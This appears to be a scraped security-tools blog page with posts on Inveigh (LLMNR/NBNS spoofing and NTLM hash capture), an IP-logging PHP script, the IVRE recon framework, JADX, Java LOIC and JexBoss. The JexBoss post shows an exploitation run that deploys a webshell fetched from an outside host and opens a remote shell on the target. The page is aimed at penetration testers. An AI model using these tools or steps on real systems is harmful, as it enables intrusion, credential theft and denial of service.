       <a href="http://2.bp.blogspot.com/-OFCNzWE8HpM/Va0KrFk33KI/AAAAAAAAEZo/oK-U4lYiRJg/s1600/Inveigh.PNG" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="270" src="http://2.bp.blogspot.com/-OFCNzWE8HpM/Va0KrFk33KI/AAAAAAAAEZo/oK-U4lYiRJg/s640/Inveigh.PNG" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Inveigh is a Windows PowerShell LLMNR/NBNS spoofer designed to assist penetration testers that find themselves limited to a Windows system. This can commonly occur while performing phishing attacks, USB drive attacks, VLAN pivoting, or simply being restricted to a Windows system as part of client imposed restrictions.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Notes</span></b>
      </div> 
      <ol> 
       <li style="text-align: justify;">Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/SMB NTLMv1/NTLMv2 challenge/response capture.</li> 
       <li style="text-align: justify;">LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets. </li> 
       <li style="text-align: justify;">SMB challenge/response captures are performed by sniffing over the host system's SMB service.</li> 
       <li style="text-align: justify;">HTTP challenge/response captures are performed with a dedicated listener.</li> 
       <li style="text-align: justify;">The local LLMNR/NBNS services do not need to be disabled on the host system. </li> 
       <li style="text-align: justify;">LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.</li> 
       <li style="text-align: justify;">Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.</li> 
       <li style="text-align: justify;">Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.</li> 
       <li style="text-align: justify;">Output files will be created in current working directory.</li> 
       <li style="text-align: justify;">If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.</li> 
      </ol> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Usage</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Obtain an elevated administrator or SYSTEM shell. If necessary, use a method to bypass script execution policy.
      </div> 
      <div style="text-align: justify;">
        To execute with default settings:
      </div> 
      <pre><code>Inveigh.ps1 -i localip</code></pre> To execute with features enabled/disabled:
      <br> 
      <pre><code>Inveigh.ps1 -i localip -LLMNR Y/N -NBNS Y/N -HTTP Y/N -HTTPS Y/N -SMB Y/N -Repeat Y/N -ForceWPADAuth Y/N</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank">Download&nbsp;Inveigh</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="8076094605642290939" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> IP Thief - Simple IP Stealer in PHP  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8076094605642290939" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-L5cDJniTKq4/VNE7GyrtXUI/AAAAAAAADpg/Sqc27TqGbdM/s1600/ip_thief.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-L5cDJniTKq4/VNE7GyrtXUI/AAAAAAAADpg/Sqc27TqGbdM/s1600/ip_thief.jpg" height="568" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        A simple PHP script to capture the IP address of anyone that send the "imagen.php" file with the following options:
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;">
        [+] It comes with an administrator to view and delete IP
      </div> 
      <div style="text-align: justify;">
        [+] You can change the redirect URL image
      </div> 
      <div style="text-align: justify;">
        [+] Can you see the country of the visitor
       <br> 
       <br>
      </div> 
      <br> 
      <div style="text-align: center;"> 
       <b><span class="Apple-style-span" style="font-size: x-large;"><a href="http://sourceforge.net/projects/ipthief/" target="_blank">Download IP Thief</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="7421806212596178322" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> IVRE - A Python network recon framework, based on Nmap, Bro &amp; p0f  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7421806212596178322" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-_i5Wcfupr4Y/VayRDd4jjOI/AAAAAAAAEZU/Cc9c8vopZ3U/s1600/ivre.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="342" src="http://1.bp.blogspot.com/-_i5Wcfupr4Y/VayRDd4jjOI/AAAAAAAAEZU/Cc9c8vopZ3U/s640/ivre.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        IVRE (Instrument de veille sur les réseaux extérieurs) or DRUNK (Dynamic Recon of UNKnown networks) is a network recon framework, including two modules for passive recon (one 
       <a href="http://lcamtuf.coredump.cx/p0f/">p0f</a>-based and one 
       <a href="https://www.bro.org/">Bro</a>-based) and one module for active recon (mostly 
       <a href="http://nmap.org/">Nmap</a>-based, with a bit of 
       <a href="https://zmap.io/">ZMap</a>).
      </div> 
      <div style="text-align: justify;">
        The advertising slogans are:
      </div> 
      <ul> 
       <li style="text-align: justify;">(in French): IVRE, il scanne Internet.</li> 
       <li style="text-align: justify;">(in English): Know the networks, get DRUNK!</li> 
      </ul> 
      <div style="text-align: justify;">
        The names IVRE and DRUNK have been chosen as a tribute to "Le Taullier".
      </div> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;"> External programs / dependencies</span></b>
      <br> 
      <br> IVRE relies on:
      <br> 
      <ul> 
       <li><a href="http://www.python.org/">Python</a> 2, version 2.6 minimum<br> 
        <ul> 
         <li>the <a href="http://www.pycrypto.org/">Crypto</a> module</li> 
         <li>the <a href="http://api.mongodb.org/python/">pymongo</a> module, version 2.7.2 minimum.</li> 
        </ul> </li> 
       <li><a href="http://nmap.org/">Nmap</a> &amp; <a href="https://zmap.io/">ZMap</a></li> 
       <li><a href="http://www.bro.org/">Bro</a> &amp; <a href="http://lcamtuf.coredump.cx/p0f/">p0f</a></li> 
       <li><a href="http://www.mongodb.org/">MongoDB</a>, version 2.6 minimum</li> 
       <li>a web server (successfully tested with <a href="https://httpd.apache.org/">Apache</a> and <a href="http://nginx.org/">Nginx</a>, should work with anything capable of serving static files and run a Python-based CGI), although a test web server is now distributed with IVRE (<code>httpd-ivre</code>)</li> 
       <li>a web browser (successfully tested with recent versions of <a href="https://www.mozilla.org/firefox/">Firefox</a> and <a href="http://www.chromium.org/">Chromium</a>)</li> 
       <li>Maxmind <a href="https://www.maxmind.com/en/geolocation_landing">GeoIP</a> free databases</li> 
       <li>optionally <a href="https://code.google.com/p/tesseract-ocr/">Tesseract</a>, if you plan to add screenshots to your Nmap scan results</li> 
       <li>optionally <a href="http://www.docker.com/">Docker</a> &amp; <a href="https://www.vagrantup.com/">Vagrant</a> (version 1.6 minimum)</li> 
      </ul> IVRE comes with (refer to the 
      <a href="https://github.com/cea-sec/ivre/blob/master/doc/LICENSE-EXTERNAL.md">LICENSE-EXTERNAL</a> file for the licenses):
      <br> 
      <ul> 
       <li><a href="https://angularjs.org/">AngularJS</a></li> 
       <li><a href="http://getbootstrap.com/">Twitter Bootstrap</a></li> 
       <li><a href="https://jquery.com/">jQuery</a></li> 
       <li><a href="http://d3js.org/">D3.js</a></li> 
       <li><a href="https://lipis.github.io/flag-icon-css/">flag-icon-css</a></li> 
      </ul> 
      <div> 
       <br>
      </div> 
      <div> 
       <b><span style="font-size: x-large;">Passive recon</span></b>
       <br> 
       <br> The following steps will show some examples of 
       <strong>passive</strong> network recon with IVRE. If you only want 
       <strong>active</strong> (for example, Nmap-based) recon, you can skip this part.
       <br> 
       <br> 
       <b><span style="font-size: large;">Using Bro</span></b>
       <br> 
       <br> You need to run bro (2.3 minimum) with the option 
       <code>-b</code> and the location of the 
       <code>passiverecon.bro</code> file. If you want to run it on the 
       <code>eth0</code> interface, for example, run:
       <br> 
       <pre><code># mkdir logs
# bro -b /usr/local/share/ivre/passiverecon/passiverecon.bro -i eth0
</code></pre> If you want to run it on the 
       <code>capture</code> file (
       <code>capture</code> needs to a PCAP file), run:
       <br> 
       <pre><code>$ mkdir logs
$ bro -b /usr/local/share/ivre/passiverecon/passiverecon.bro -r capture
</code></pre> This will produce log files in the 
       <code>logs</code> directory. You need to run a 
       <code>passivereconworker</code> to process these files. You can try:
       <br> 
       <pre><code>$ passivereconworker --directory=logs
</code></pre> This program will not stop by itself. You can (
       <code>p</code>)
       <code>kill</code> it, it will stop gently (as soon as it has finished to process the current file).
       <br> 
       <br> 
       <b><span style="font-size: large;">Using p0f</span></b>
       <br> 
       <br> To start filling your database with information from the 
       <code>eth0</code> interface, you just need to run (
       <code>passiverecon</code> is just a sensor name here):
       <br> 
       <pre><code># p0f2db -s passiverecon iface:eth0
</code></pre> And from the same 
       <code>capture</code> file:
       <br> 
       <pre><code>$ p0f2db -s passiverecon capture
</code></pre> 
       <br> 
       <b><span style="font-size: large;">Using the results</span></b>
       <br> 
       <br> You have two options for now:
       <br> 
       <ul> 
        <li>the <code>ipinfo</code> command line tool</li> 
        <li>the <code>db.passive</code> object of the <code>ivre.db</code> Python module</li> 
       </ul> For example, to show everything stored about an IP address or a network:
       <br> 
       <pre><code>$ ipinfo 1.2.3.4
$ ipinfo 1.2.3.0/24
</code></pre> See the output of 
       <code>ipinfo --help</code>.
       <br> To use the Python module, run for example:
       <br> 
       <pre><code>$ python
&gt;&gt;&gt; from ivre.db import db
&gt;&gt;&gt; db.passive.get(db.passive.flt_empty)[0]
</code></pre> For more, run 
       <code>help(db.passive)</code> from the Python shell.
       <br> 
       <br> 
       <b><span style="font-size: x-large;">Active recon</span></b>
       <br> 
       <br> 
       <b><span style="font-size: large;">Scanning</span></b>
       <br> 
       <br> The easiest way is to install IVRE on the "scanning" machine and run:
       <br> 
       <pre><code># runscans --routable --limit 1000 --output=XMLFork
</code></pre> This will run a standard scan against 1000 random hosts on the Internet by running 30 nmap processes in parallel. See the output of 
       <code>runscans --help</code> if you want to do something else.
       <br> When it's over, to import the results in the database, run:
       <br> 
       <pre><code>$ nmap2db -c ROUTABLE-CAMPAIGN-001 -s MySource -r scans/ROUTABLE/up
</code></pre> Here, 
       <code>ROUTABLE-CAMPAIGN-001</code> is a category (just an arbitrary name that you will use later to filter scan results) and 
       <code>MySource</code> is a friendly name for your scanning machine (same here, an arbitrary name usable to filter scan results; by default, when you insert a scan result, if you already have a scan result for the same host address with the same source, the previous result is moved to an "archive" collection (fewer indexes) and the new result is inserted in the database).
       <br> There is an alternative to installing IVRE on the scanning machine that allows to use several agents from one master. See the 
       <a href="https://github.com/cea-sec/ivre/blob/master/doc/AGENT.md">AGENT</a> file, the program 
       <code>runscans-agent</code> for the master and the 
       <code>agent/</code> directory in the source tree.
       <br> 
       <br> 
       <b><span style="font-size: large;">Using the results</span></b>
       <br> 
       <br> You have three options:
       <br> 
       <ul> 
        <li>the <code>scancli</code> command line tool</li> 
        <li>the <code>db.nmap</code> object of the <code>ivre.db</code> Python module</li> 
        <li>the web interface</li> 
       </ul> 
       <br> 
       <b>CLI: scancli</b>
       <br> 
       <br> To get all the hosts with the port 22 open:
       <br> 
       <pre><code>$ scancli --port 22
</code></pre> See the output of 
       <code>scancli --help</code>.
       <br> 
       <br> 
       <b>Python module</b>
       <br> 
       <br> To use the Python module, run for example:
       <br> 
       <pre><code>$ python
&gt;&gt;&gt; from ivre.db import db
&gt;&gt;&gt; db.nmap.get(db.nmap.flt_empty)[0]
</code></pre> For more, run 
       <code>help(db.nmap)</code> from the Python shell.
       <br> 
       <br> 
       <b>Web interface</b>
       <br> 
       <br> The interface is meant to be easy to use, it has its own 
       <a href="https://github.com/cea-sec/ivre/blob/master/doc/WEBUI.md">documentation</a>.
       <br> 
       <br> 
       <br> 
       <div style="text-align: center;"> 
        <b><span style="font-size: x-large;"><a href="https://github.com/cea-sec/ivre" target="_blank">Download&nbsp;IVRE</a></span></b>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="7702961983924815368" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> JADX - Java source code from Android Dex and Apk files  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7702961983924815368" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-o8ioapVq6Hs/VMz0JWo-cHI/AAAAAAAADn8/S9YgWRzHpNY/s1600/JADX.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-o8ioapVq6Hs/VMz0JWo-cHI/AAAAAAAADn8/S9YgWRzHpNY/s1600/JADX.png" height="470" width="640"></a>
      </div> 
      <br> Command line and GUI tools for produce Java source code from Android Dex and Apk files.
      <br> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;">Usage</span></b>
      <br> 
      <br> 
      <pre><code>jadx[-gui] [options] &lt;input file&gt; (.dex, .apk, .jar or .class)
options:
 -d, --output-dir    - output directory
 -j, --threads-count - processing threads count
 -f, --fallback      - make simple dump (using goto instead of 'if', 'for', etc)
     --cfg           - save methods control flow graph to dot file
     --raw-cfg       - save methods control flow graph (use raw instructions)
 -v, --verbose       - verbose output
 -h, --help          - print this help
Example:
 jadx -d out classes.dex
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/skylot/jadx" target="_blank">Download JADX</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="251789322861126622" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Java LOIC - Low Orbit Ion Cannon. A Java based network stress testing application  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-251789322861126622" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-JDsDN1gmKtc/VVpgGSX21SI/AAAAAAAAEBs/FQy1VYZxuAg/s1600/java_loic.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="374" src="http://4.bp.blogspot.com/-JDsDN1gmKtc/VVpgGSX21SI/AAAAAAAAEBs/FQy1VYZxuAg/s640/java_loic.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Low Orbit Ion Cannon. The project is a Java implementation of LOIC written by Praetox but it's not related with the original project. The main purpose of Java LOIC is testing your network.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Java LOIC should work on most operating systems.
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="http://sourceforge.net/projects/javaloic/" target="_blank">Download&nbsp;Java LOIC</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="628921417146447813" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> JexBoss - Jboss Verify And Exploitation Tool  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-628921417146447813" itemprop="articleBody">
       JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server.
      <br> 
      <a name="more"></a>
      <br> 
      <h2> Requirements</h2> 
      <ul> 
       <li>Python &lt;= 2.7.x</li> 
      </ul> 
      <br> 
      <h2> Installation</h2> To install the latest version of JexBoss, please use the following commands:
      <br> 
      <pre><code>git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
python jexboss.py
</code></pre> 
      <br> 
      <h2> Features</h2> The tool and exploits were developed and tested for versions 3, 4, 5 and 6 of the JBoss Application Server.
      <br> The exploitation vectors are:
      <br> 
      <ul> 
       <li>/jmx-console 
        <ul> 
         <li>tested and working in JBoss versions 4, 5 and 6</li> 
        </ul> </li> 
       <li>/web-console/Invoker 
        <ul> 
         <li>tested and working in JBoss versions 4</li> 
        </ul> </li> 
       <li>/invoker/JMXInvokerServlet 
        <ul> 
         <li>tested and working in JBoss versions 4 and 5</li> 
        </ul> </li> 
      </ul> 
      <br> 
      <h2> Usage example</h2> 
      <ul> 
       <li>Check the file "demo.png"</li> 
      </ul> 
      <pre><code>$ git clone https://github.com/joaomatosf/jexboss.git
$ cd jexboss
$ python jexboss.py https://site-teste.com

 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="670d0806080a061308140127000a060e0b4904080a">[email&nbsp;protected]</a>                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#


 ** Checking Host: https://site-teste.com **

 * Checking web-console:           [ OK ]
 * Checking jmx-console:           [ VULNERABLE ]
 * Checking JMXInvokerServlet:         [ VULNERABLE ]


 * Do you want to try to run an automated exploitation via "jmx-console" ?
   This operation will provide a simple command shell to execute commands on the server..
   Continue only if you have permission!
   yes/NO ? yes

 * Sending exploit code to https://site-teste.com. Wait...


 * Info: This exploit will force the server to deploy the webshell 
   available on: http://www.joaomatosf.com/rnp/jbossass.war
 * Successfully deployed code! Starting command shell, wait...

 * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * 

 * https://site-teste.com: 

 Linux fwgw 2.6.32-431.29.2.el6.x86_64 #1 SMP Tue Sep 9 21:36:05 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

 CentOS release 6.5 (Final)

 uid=509(jboss) gid=509(jboss) grupos=509(jboss) context=system_u:system_r:initrc_t:s0

[Type commands or "exit" to finish]
Shell&gt; pwd
/usr/jboss-6.1.0.Final/bin

[Type commands or "exit" to finish]
Shell&gt; hostname
fwgw

[Type commands or "exit" to finish]
Shell&gt; ls -all /tmp 
total 35436
drwxrwxrwt.  4 root root     4096 Nov 24 16:36 .
dr-xr-xr-x. 22 root root     4096 Nov 23 03:26 ..
-rw-r--r--.  1 root root 34630995 Out 15 18:07 snortrules-snapshot-2962.tar.gz
-rw-r--r--.  1 root root       32 Out 16 14:51 snortrules-snapshot-2962.tar.gz.md5
-rw-------.  1 root root        0 Set 20 16:45 yum.log
-rw-------.  1 root root     2743 Set 20 17:18 yum_save_tx-2014-09-20-17-18nQiKVo.yumtx
-rw-------.  1 root root     1014 Out  6 00:33 yum_save_tx-2014-10-06-00-33vig5iT.yumtx
-rw-------.  1 root root      543 Out  6 02:14 yum_save_tx-2014-10-06-02-143CcA5k.yumtx
-rw-------.  1 root root    18568 Out 14 03:04 yum_save_tx-2014-10-14-03-04Q9ywQt.yumtx
-rw-------.  1 root root      315 Out 15 16:00 yum_save_tx-2014-10-15-16-004hKzCF.yumtx

[Type commands or "exit" to finish]
Shell&gt;
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/joaomatosf/jexboss" target="_blank">Download JexBoss</a></span></b>
      </div>
